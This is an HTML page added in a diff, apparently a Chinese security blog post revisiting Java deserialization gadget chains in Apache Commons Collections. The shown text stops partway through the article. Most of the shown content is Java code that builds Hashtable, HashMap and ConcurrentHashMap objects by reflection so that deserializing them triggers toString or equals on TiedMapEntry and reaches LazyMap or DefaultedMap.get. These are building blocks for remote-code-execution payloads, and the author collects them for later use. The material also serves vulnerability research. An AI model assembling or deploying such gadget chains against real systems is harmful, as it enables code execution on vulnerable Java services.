@@ -1,0 +1,817 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言​		最近黑神话悟空火热，大家都开启二周目。现在正直网安特殊时间，时间较多，随准备重走一遍反序列取经路，看看有没有新的触发方式，记录一下，方便以后直接使用。 0x01 commons.collections (map.get)​		最经典的反序列化gadget，触发点 LazyMap.get    这里LazyMap可以换成DefaultedMap (3.1没有这个类) 1234LazyMap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列二周目(一)">
+<meta property="og:url" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="前言​		最近黑神话悟空火热，大家都开启二周目。现在正直网安特殊时间，时间较多，随准备重走一遍反序列取经路，看看有没有新的触发方式，记录一下，方便以后直接使用。 0x01 commons.collections (map.get)​		最经典的反序列化gadget，触发点 LazyMap.get    这里LazyMap可以换成DefaultedMap (3.1没有这个类) 1234LazyMap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823135940290.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823134729920.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823134736608.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823134748543.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823134818012.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823141751373.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823142441405.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823145130393.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823145138574.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823171628559.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823152533206.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823153834885.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823153847089.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823153927816.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823153936586.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823155348825.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823160442171.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823165115069.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823164127407.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823164138048.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823163721352.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823163741815.png">
+<meta property="article:published_time" content="2024-08-23T05:32:33.000Z">
+<meta property="article:modified_time" content="2024-08-23T09:39:55.463Z">
+<meta property="article:author" content="unam4">
+<meta property="article:tag" content="gadget">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/image-20240823135940290.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>java反序列二周目(一) - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="java反序列二周目(一)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-23 13:32" pubdate>
+          2024年8月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          435 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          4 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">java反序列二周目(一)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​		最近黑神话悟空火热，大家都开启二周目。现在正直网安特殊时间，时间较多，随准备重走一遍反序列取经路，看看有没有新的触发方式，记录一下，方便以后直接使用。</p>
+<h2 id="0x01-commons-collections-map-get"><a href="#0x01-commons-collections-map-get" class="headerlink" title="0x01 commons.collections (map.get)"></a>0x01 commons.collections (map.get)</h2><p>​		最经典的反序列化gadget，触发点</p>
+<p>LazyMap.get    这里LazyMap可以换成DefaultedMap (<strong>3.1没有这个类</strong>)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">LazyMap.get()/TransformedMap.setValue()<br>    ChainedTransformer.transform()<br>        ConstantTransformer.transform()<br>            InvokerTransformer.transform()<br></code></pre></td></tr></table></figure>
+
+<p>org.apache.commons.collections.map.DefaultedMap#get</p>
+<p><img src="image-20240823135940290.png" srcset="/img/loading.gif" lazyload alt="image-20240823135940290"></p>
+<p>DefaultedMap的value可控，后面大差不差</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> DefaultedMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">Field</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> DefaultedMap.class.getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>);<br>value.setAccessible(<span class="hljs-literal">true</span>);<br>value.set(decorate,chain);<br></code></pre></td></tr></table></figure>
+
+<p>org.apache.commons.collections.keyvalue.TiedMapEntry</p>
+<p><img src="image-20240823134729920.png" srcset="/img/loading.gif" lazyload alt="image-20240823134729920"></p>
+<p><img src="image-20240823134736608.png" srcset="/img/loading.gif" lazyload alt="image-20240823134736608"></p>
+<p><img src="image-20240823134748543.png" srcset="/img/loading.gif" lazyload alt="image-20240823134748543"></p>
+<p><img src="image-20240823134818012.png" srcset="/img/loading.gif" lazyload alt="image-20240823134818012"></p>
+<p>也就是TiedMapEntry的equals，hashCode，toString 都能触发到LazyMap.get。那我们只要找到调用到这个三个方法的头就行。</p>
+<p>整理一下，目前我手里的 (还藏了几个)</p>
+<p>由于在map里面put时，自动会计算hashcode，所以不罗列。</p>
+<h3 id="hashtable触发tostring"><a href="#hashtable触发tostring" class="headerlink" title="hashtable触发tostring"></a>hashtable触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    tHashMap2.put(o,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    hashtable.put(tHashMap1,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    hashtable.put(tHashMap2,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br><br>    tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>    tHashMap2.put(o, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="hashmap触发tostring"><a href="#hashmap触发tostring" class="headerlink" title="hashmap触发tostring"></a>hashmap触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmapToString</span><span class="hljs-params">(Object o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o1,<span class="hljs-literal">null</span>);<br>    tHashMap2.put(o2,<span class="hljs-literal">null</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>    Array.set(arr, <span class="hljs-number">0</span>, node1);<br>    Array.set(arr, <span class="hljs-number">1</span>, node2);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;table&quot;</span>, arr);<br>    <span class="hljs-keyword">return</span> hashMap;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Hashtable触发equals"><a href="#Hashtable触发equals" class="headerlink" title="Hashtable触发equals"></a>Hashtable触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTable</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    utils.setFieldValue(hashtable,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    nodeC = Class.forName(<span class="hljs-string">&quot;java.util.Hashtable$Entry&quot;</span>);<br><br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;Unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;Springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(hashtable, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="HashMap-触发equals"><a href="#HashMap-触发equals" class="headerlink" title="HashMap 触发equals"></a>HashMap 触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="ConcurrentHashMap触发equals"><a href="#ConcurrentHashMap触发equals" class="headerlink" title="ConcurrentHashMap触发equals"></a>ConcurrentHashMap触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeConcurrentMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>     ConcurrentHashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;sizeCtl&quot;</span>, <span class="hljs-number">2</span>);<br>     Class&lt;?&gt; nodeC;<br>     <span class="hljs-keyword">try</span> &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125;<br>     Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>     nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>     Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-literal">null</span>));<br>     Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-literal">null</span>));<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>     <span class="hljs-keyword">return</span> s;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="AnnotationInvocationHandler触发tostring-（jdk"><a href="#AnnotationInvocationHandler触发tostring-（jdk" class="headerlink" title="AnnotationInvocationHandler触发tostring （jdk&lt;8u20）"></a>AnnotationInvocationHandler触发tostring （jdk&lt;8u20）</h3><p>sun.reflect.annotation.AnnotationInvocationHandler#readObject</p>
+<p><img src="image-20240823141751373.png" srcset="/img/loading.gif" lazyload alt="image-20240823141751373"></p>
+<p>可以这个vaule直接和字符拼接，会触发value.tostring。value是memberValues 这个map里的vaule，可控。</p>
